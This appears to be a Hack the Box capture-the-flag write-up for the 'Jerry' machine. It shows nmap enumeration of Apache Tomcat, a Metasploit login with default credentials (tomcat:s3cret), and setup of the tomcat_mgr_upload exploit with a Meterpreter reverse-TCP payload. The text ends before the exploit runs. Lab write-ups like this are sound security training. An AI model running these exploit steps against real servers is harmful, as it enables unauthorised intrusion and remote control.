![jerry](https://github.com/EESantiago/Writeups/blob/master/Hack%20the%20Box/Machines/Jerry/jerry.png)
\

## Enumeration

\
Start with an nmap scan:

\
```
nmap -A 10.10.10.95
```

\
```
Starting Nmap 7.25BETA2 ( https://nmap.org ) at 2018-07-26 15:18 EDT
Nmap scan report for 10.10.10.95
Host is up (0.10s latency).
Not shown: 999 filtered ports
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2012|7 (90%)
OS CPE: cpe:/o:microsoft:windows_server_2012 cpe:/o:microsoft:windows_7::-:professional
Aggressive OS guesses: Microsoft Windows Server 2012 (90%), Microsoft Windows Server 2012 or Windows Server 2012 R2 (90%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows 7 Professional (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   102.96 ms 10.10.14.1
2   104.81 ms 10.10.10.95

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.45 seconds
```

\
Looks like the only port open is 8080, which is running Apache Tomcat 1.1.  Some research pointed me to a [metasploit module](https://www.rapid7.com/db/modules/auxiliary/scanner/http/tomcat_mgr_login) for logging into Apache Tomcat using default credentials.  Using this I got the credentials tomcat:s3cret.  Now we can use the [tomcat manager authenticated upload module](https://www.hackingarticles.in/multiple-ways-to-exploit-tomcat-manager/). This module can be used to execute a payload on Apache Tomcat servers that have an exposed “manager” application. The payload is uploaded as a WAR archive containing a JSP application using a POST request against the /manager/html/upload component:

\
```
msf > use exploit/multi/http/tomcat_mgr_upload
msf exploit(tomcat_mgr_upload) > set HttpUsername tomcat
HttpUsername => tomcat
msf exploit(tomcat_mgr_upload) > set HttpPassword s3cret
HttpPassword => s3cret
msf exploit(tomcat_mgr_upload) > set RHOST 10.10.10.95
RHOST => 10.10.10.95
msf exploit(tomcat_mgr_upload) > set RPORT 8080
RPORT => 8080
msf exploit(tomcat_mgr_upload) > set payload java/meterpreter/reverse_tcp 
payload => java/meterpreter/reverse_tcp
msf exploit(tomcat_mgr_upload) > check
[*] 10.10.10.95:8080 The target appears to be vulnerable.
msf exploit(tomcat_mgr_upload) > set lhost 10.10.14.232
lhost => 10.10.14.232
```

\


